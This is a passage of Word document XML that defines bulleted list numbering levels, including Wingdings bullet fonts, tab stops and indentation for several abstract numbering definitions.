      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7AEAE448" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="1C925330" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="CCFED67A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="B0FC4792" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0A68AA96" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="112">
    <w:nsid w:val="40A670E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="54F0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419A7653"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4AD2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1FB0E7B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8628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420037E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="912E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422B2874"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="44D4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29813F2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BDB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2B605EB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6B0C2E9C"/>
    <w:lvl w:ilvl="0" w:tplc="858A9F42">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="2B64EDB6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="F328D396" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D586FA68" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="12EC2C44" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="A80C753C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="E21CEF08" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="ABBA9608" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="2F1EE5B0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="119">
    <w:nsid w:val="42DD5DFE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="53B2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431E1301"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8C1A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3F428FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9A8C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5E77F6B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2590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686373E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AFA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74B501A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="81CA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8913845"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DFA43062"/>
    <w:lvl w:ilvl="0" w:tplc="A742250C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="9CCCBBAA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="FFD665D2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="C4627F3E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0E0C1ECE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="318E5DF0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="55EA6070" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="FE78DF2C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="3A7E7B16" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="126">
    <w:nsid w:val="49241D05"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="21B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95342C3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F796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4A696221"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="916E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A9321B6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DC04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AFC7802"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5F5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4B400F4D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4F80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4C180B22"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9686F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C62133B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="05AA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C6C15AC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4E5C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C885258"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="96DC03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CBD2BB8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E832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4CCB419E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F8B2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D2D6F2C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6882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D6606A2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5FDAB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4EAF4CC8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AB62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4EB94ACC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8CDC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F454C1C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25A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FA81D79"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DE449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504F2F22"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C534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5074302E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FD1E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508D677C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B360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nsid w:val="516C6E7F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B192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1811A53"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="136EE036"/>
    <w:lvl w:ilvl="0" w:tplc="22A8D770">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="6286488A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="44084CD6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1222EDCA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0674E188" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="DEEA547E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="EA066BB2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="E75E977A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="91A047CC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="149">
    <w:nsid w:val="52D27BD1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8DC6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5851B9C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EA2E8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6042246"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="198E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57645983"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="73F2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583A669B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4BA8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nsid w:val="59BC50F7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C19E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59CB1A29"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A25C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A7F7F12"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3B56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AA0058B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9C2E1E10"/>
    <w:lvl w:ilvl="0" w:tplc="8B7445DA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0EFE86E4">
      <w:start w:val="4948"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="6172B006" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="803C023C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="F7B81A72" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="02A6EF64" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="6BB4791A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="4A724A88" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="D828F0AE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="158">
    <w:nsid w:val="5B550370"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0178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5C4D3336"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D880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C7F4258"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D9B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C9F1AB0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F04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CB72364"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B9FE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CFE44AF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E4229C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D0A1707"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1804C75C"/>
    <w:lvl w:ilvl="0" w:tplc="D2FA5416">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="6882A1F8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="307A13C4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="88C8F2C6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="35C63CD4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="FBC0ACAC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="B4F4A8A0" w:tentative="1">
      <w:start w:val="1"/>
